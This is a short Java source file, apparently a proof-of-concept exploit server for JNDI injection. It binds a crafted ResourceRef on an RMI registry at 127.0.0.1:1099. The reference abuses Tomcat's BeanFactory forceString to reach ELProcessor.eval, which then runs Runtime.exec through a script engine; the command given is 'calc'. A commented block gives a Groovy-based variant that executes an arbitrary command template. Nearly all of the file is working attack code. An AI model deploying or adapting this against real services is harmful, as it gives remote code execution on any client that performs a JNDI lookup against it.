package org.example;

import java.util.concurrent.CountDownLatch;
import com.sun.jndi.rmi.registry.*;
import java.rmi.RemoteException;
import javax.naming.*;
import org.apache.naming.ResourceRef;

public class EvilServerByFactory {
    public static void main(String[] args) throws Exception {
        ResourceRef ref = new ResourceRef("javax.el.ELProcessor", null, "", "", true,"org.apache.naming.factory.BeanFactory",null);
        ref.add(new StringRefAddr("forceString", "x=eval"));
        ref.add(new StringRefAddr("x", String.format(
                "\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(" +
                        "\"java.lang.Runtime.getRuntime().exec('%s')\"" +
                        ")",
                "calc"
        )));

        Context ctx = new InitialContext();
        ctx.bind("rmi://127.0.0.1:1099/user", ref);

        CountDownLatch latch=new CountDownLatch(1);
        latch.await();
    }


    /*
     * 利用Groovy
        ResourceRef ref = new ResourceRef("groovy.lang.GroovyShell", null, "", "", true,"org.apache.naming.factory.BeanFactory",null);
        ref.add(new StringRefAddr("forceString", "x=evaluate"));
        String script = String.format("'%s'.execute()", commandGenerator.getBase64CommandTpl());
        ref.add(new StringRefAddr("x",script));

     */
}
